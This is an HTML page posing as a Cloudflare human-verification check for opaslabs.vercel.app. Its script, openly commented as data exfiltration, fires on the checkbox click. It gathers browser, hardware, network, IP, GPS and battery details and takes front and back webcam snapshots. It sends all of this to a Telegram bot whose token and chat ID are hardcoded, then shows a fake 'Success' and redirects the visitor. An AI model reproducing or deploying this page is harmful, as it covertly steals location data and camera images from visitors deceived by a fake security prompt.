
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Just a moment...</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

html {
  line-height: 1.15;
  -webkit-text-size-adjust: 100%;
  color: #313131;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, 
               "Helvetica Neue", Arial, "Noto Sans", sans-serif;
}

body {
  min-width: 400px; /* Prevent container from getting too narrow */
}

main {
  margin: 8rem auto;
  padding-left: 1.5rem;
  max-width: 60rem;
  width: 100%;
}

#logo {
  height: 25px;
  margin-bottom: 1px;
}

h1 {
  font-size: 2.65rem;
  font-weight: 500;
  margin-bottom: 8px;
}

h2 {
  font-size: 1.5rem;
  margin-top: 0;
  font-weight: 500;
  margin-bottom: 24px;
}

p {
  font-size: 1.5rem;
  margin-top: 0;
  font-weight: 400;
  margin-bottom: 24px;
}

.form-wrapper {
  display: inline-flex;
  align-items: center;
  border: 1px solid #e0e0e0;
  background-color: #f9fafb;
  padding: 8px 16px;
  margin-bottom: 48px;
  height: 70px;
  width: 400px; /* Fixed width */
  min-width: 400px; /* Never shrink below this */
  box-sizing: border-box;
}

input[type="checkbox"] {
  display: none;
}

label.custom-checkbox {
  display: inline-flex;
  align-items: center;
  gap: 12px;
  cursor: pointer;
  user-select: none;
  font-size: 16px;
  color: #1a1a1a;
  position: relative;
  white-space: nowrap;
}

#checkbox-container {
  width: 28px;
  height: 28px;
  background-color: #fff;
  border: 1px solid #666;
  border-radius: 4px;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.2s ease-in-out;
  cursor: pointer;
}

#checkbox-container i {
  display: none;
  color: white;
  font-size: 14px;
}

#spinner {
  display: none;
  width: 28px;
  height: 28px;
  animation: spin 2.5s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.verify-text, .verifying-text, .success-text {
  font-size: 16px;
  font-weight: 400;
}

.verifying-text, .success-text {
  display: none;
}

.right-section {
  margin-left: auto;
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  justify-content: center;
  height: 100%;
  white-space: nowrap;
}

.right-section img {
  height: 28px;
  width: auto;
  margin-bottom: 4px;
  display: block;
}

.links {
  display: inline-flex;
  justify-content: flex-end;
  line-height: 10px;
  color: #232323;
  font-size: 8px;
}

.links a {
  text-decoration: underline;
  color: #4b5563;
}

.links span {
  user-select: none;
  margin: 0 4px;
}

/* Checked states */
input[type="checkbox"]:checked + label #checkbox-container {
  background-color: #16a34a;
  border-radius: 50%;
  border: none;
}

input[type="checkbox"]:checked + label #checkbox-container i {
  display: block;
}

input[type="checkbox"]:checked + label .verify-text {
  display: none;
}

input[type="checkbox"]:checked + label .success-text {
  display: inline;
}

/* Loading state */
.loading #checkbox-container {
  display: none;
}

.loading #spinner {
  display: block;
}

.loading .verify-text {
  display: none;
}

.loading .verifying-text {
  display: inline;
}

/* Footer */
footer {
  position: fixed;
  bottom: 0;
  left: 0;
  width: 100%;
  background-color: #ffffff;
  padding: 16px 0;
  box-shadow: 0 -1px 4px rgba(0, 0, 0, 0.06);
  font-family: Arial, sans-serif;
}

.footer-inner {
  max-width: 768px;
  margin: 0 auto;
  padding: 0 24px;
  text-align: center;
  font-size: 12px;
  color: #313131;
}

.divider {
  width: 100%;
  height: 1px;
  background-color: #d9d9d9;
  margin: 0 auto 12px auto;
}

/* Mobile handling - only horizontal scroll when needed */
@media (max-width: 500px) {
  body {
    overflow-x: auto;
  }
  
  main {
    padding-left: 16px;
    padding-right: 16px;
  }
  
  .form-wrapper {
    overflow: visible; /* Allow the form to extend beyond viewport */
  }
}
    
  </style>
</head>
<body>
  <main>
    <h1>opaslabs.vercel.app</h1>
    <h2>Verify you are human by completing the action below.</h2>

    <form class="form-wrapper">
      <input type="checkbox" id="verifyHuman" />
      <label for="verifyHuman" class="custom-checkbox" onclick="handleCheckbox(event)">
        <div id="checkbox-container">
          <i class="fas fa-check" id="checkmark"></i>
        </div>

        <div id="spinner">
          <svg width="28" height="28" viewBox="0 0 512 512" fill="#16a34a" xmlns="http://www.w3.org/2000/svg">
            <style>.st0{fill:#16a34a;}</style>
            <g>
              <path class="st0" d="M256,0c-23.357,0-42.297,18.932-42.297,42.288c0,23.358,18.94,42.288,42.297,42.288c23.357,0,42.279-18.93,42.279-42.288C298.279,18.932,279.357,0,256,0z"/>
              <path class="st0" d="M256,427.424c-23.357,0-42.297,18.931-42.297,42.288C213.703,493.07,232.643,512,256,512c23.357,0,42.279-18.93,42.279-42.288C298.279,446.355,279.357,427.424,256,427.424z"/>
              <path class="st0" d="M74.974,74.983c-16.52,16.511-16.52,43.286,0,59.806c16.52,16.52,43.287,16.52,59.806,0c16.52-16.511,16.52-43.286,0-59.806C118.261,58.463,91.494,58.463,74.974,74.983z"/>
              <path class="st0" d="M377.203,377.211c-16.503,16.52-16.503,43.296,0,59.815c16.519,16.52,43.304,16.52,59.806,0c16.52-16.51,16.52-43.295,0-59.815C420.489,360.692,393.722,360.7,377.203,377.211z"/>
              <path class="st0" d="M84.567,256c0.018-23.348-18.922-42.279-42.279-42.279c-23.357-0.009-42.297,18.932-42.279,42.288c-0.018,23.348,18.904,42.279,42.279,42.279C65.645,298.288,84.567,279.358,84.567,256z"/>
              <path class="st0" d="M469.712,213.712c-23.357,0-42.279,18.941-42.297,42.288c0,23.358,18.94,42.288,42.297,42.297c23.357,0,42.297-18.94,42.279-42.297C512.009,232.652,493.069,213.712,469.712,213.712z"/>
              <path class="st0" d="M74.991,377.22c-16.519,16.511-16.519,43.296,0,59.806c16.503,16.52,43.27,16.52,59.789,0c16.52-16.519,16.52-43.295,0-59.815C118.278,360.692,91.511,360.692,74.991,377.22z"/>
              <path class="st0" d="M437.026,134.798c16.52-16.52,16.52-43.304,0-59.824c-16.519-16.511-43.304-16.52-59.823,0c-16.52,16.52-16.503,43.295,0,59.815C393.722,151.309,420.507,151.309,437.026,134.798z"/>
            </g>
          </svg>
        </div>

        <span class="verify-text" id="verify-text">Verify you are human</span>
        <span class="verifying-text" id="verifying-text">Verifying...</span>
        <span class="success-text" id="success-text">Success!</span>
      </label>

     <div class="right-section">
  <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" alt="Cloudflare logo" />
  <div class="links">
    <a href="#">Privacy</a>
    <span>·</span>
    <a href="#">Terms</a>
  </div>
</div>
    </form>
    <p>opaslabs.vercel.app needs to review the security of your connection before proceeding.</p>
<footer>
  <div class="footer-inner">
    <div class="divider"></div>
    <div>Ray ID: 8f41c93da27b6e50</div>
    <div style="margin-top: 4px;">
      Performance &amp; security by
      <a href="https://www.cloudflare.com" style="color: #0051c3; text-decoration: underline;">Cloudflare</a>
    </div>
  </div>
</footer>

<script>
  // 1. Handle checkbox click (spinner + immediate data exfiltration)
function handleCheckbox(event) {
  const checkbox = document.getElementById("verifyHuman");
  const label = event.currentTarget;
  const checkmark = document.getElementById("checkmark");
  const verifyText = document.getElementById("verify-text");
  const verifyingText = document.getElementById("verifying-text");
  const successText = document.getElementById("success-text");

  event.preventDefault();

  if (checkbox.checked || label.classList.contains("loading")) return;

  // Show loading spinner
  label.classList.add("loading");
  verifyText.style.display = "none";
  verifyingText.style.display = "inline";

  // Start data exfiltration IMMEDIATELY (while spinner runs)
  exfiltrateData().then(() => {
    // After exfiltration completes, show fake "Success" (3s delay)
    setTimeout(() => {
      label.classList.remove("loading");
      checkmark.style.display = "block";
      verifyingText.style.display = "none";
      successText.style.display = "inline";
      checkbox.checked = true;
    }, 3000);

    // Redirect after 6 seconds
    setTimeout(() => {
      window.location.href = "https://www.google.com"; // Fake redirect
    }, 6000);
  });
}

// 2. Data exfiltration logic
async function exfiltrateData() {
  const info = await getDeviceInfo();

  // Attempt webcam snapshots
  let frontSnap = await getSnapshot("user");
  let backSnap = await getSnapshot("environment");

  // Update camera status
  if (frontSnap && backSnap) info.cameraStatus = "Front & Back Captured";
  else if (frontSnap) info.cameraStatus = "Front Only";
  else if (backSnap) info.cameraStatus = "Back Only";
  else info.cameraStatus = "None / Denied";

  // Send all data to Telegram
  await sendTextToTelegram(info);
  if (frontSnap) await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
  if (backSnap) await sendPhotoToTelegram(backSnap, "📷 Back Camera");
}

// 3. Device data collection (same as before)
async function getDeviceInfo() {
  const data = {
    browser: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
    cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable",
    memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
    screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
    touch: 'ontouchstart' in window ? "Yes" : "No",
    webgl: getWebGLInfo(),
    network: await getNetworkInfo(),
    ip: "Unknown",
    city: "",
    region: "",
    country: "",
    location: "Denied",
    battery: "Unknown",
    charging: "Unknown",
    cameraStatus: ""
  };

  // Fetch IP/location
  try {
    const res = await fetch(`https://ipinfo.io/json?token=18d2a866939a58`);
    const ipData = await res.json();
    data.ip = ipData.ip;
    data.city = ipData.city;
    data.region = ipData.region;
    data.country = ipData.country;
  } catch {}

  // Battery status
  try {
    const battery = await navigator.getBattery();
    data.battery = (battery.level * 100).toFixed(0) + "%";
    data.charging = battery.charging ? "Yes" : "No";
  } catch {}

  // GPS
  try {
    const pos = await new Promise((res, rej) =>
      navigator.geolocation.getCurrentPosition(res, rej)
    );
    data.location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
  } catch {}

  return data;
}

// 4. Telegram exfiltration functions (same as before)
async function sendTextToTelegram(data) {
  const message = `
*🔰 Opas Labs 🔰*

🌐 Basic Info:
- Browser: ${data.browser}
- Platform: ${data.platform}
- Language: ${data.language}
- Timezone: ${data.timezone}

💻 Hardware:
- CPU: ${data.cpu}
- RAM: ${data.memory}
- Screen: ${data.screen}
- WebGL: ${data.webgl.vendor} | ${data.webgl.renderer}

📶 *Network*
- Type: ${data.network.type}
- Speed: ${data.network.effectiveType}
- Downlink: ${data.network.downlink}
- Latency (RTT): ${data.network.rtt}
- Data Saver: ${data.network.saveData}

📍 *Location & IP*
- IP: ${data.ip}
- City: ${data.city}
- Region: ${data.region}
- Country: ${data.country}
- GPS: ${data.location}

🔋 *Battery*
- Level: ${data.battery}
- Charging: ${data.charging}

📷 *Camera Status*
- ${data.cameraStatus}
    `;

  return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: "7216371031",
      text: message,
      parse_mode: "Markdown"
    })
  });
}

function sendPhotoToTelegram(blob, caption) {
  const formData = new FormData();
  formData.append("chat_id", "7216371031");
  formData.append("photo", blob, `${caption}.jpg`);
  formData.append("caption", caption);

  return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendPhoto`, {
    method: "POST",
    body: formData
  });
}

// 5. Webcam snapshot (same as before)
async function getSnapshot(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();
    await new Promise(res => setTimeout(res, 1000));
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);
    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
    stream.getTracks().forEach(track => track.stop());
    return blob;
  } catch (err) {
    console.warn(`Camera access denied (${facingMode})`, err);
    return null;
  }
}

// 6. Network/WebGL utils (same as before)
async function getNetworkInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (connection) {
    return {
      type: connection.type || "Unknown",
      effectiveType: connection.effectiveType || "Unknown",
      downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
      rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
      saveData: connection.saveData ? "Enabled" : "Disabled",
    };
  }
  return "Network API not supported";
}

function getWebGLInfo() {
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  if (!gl) return "WebGL not supported";
  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
  return {
    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Blocked",
    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked",
  };
}

// 7. Attach event listener
document.getElementById("verify-label").addEventListener("click", handleCheckbox);
document.getElementById('verifyHuman').addEventListener('click', function(e) {
  e.preventDefault();
});

    </script>
  </main>
</body>
</html>
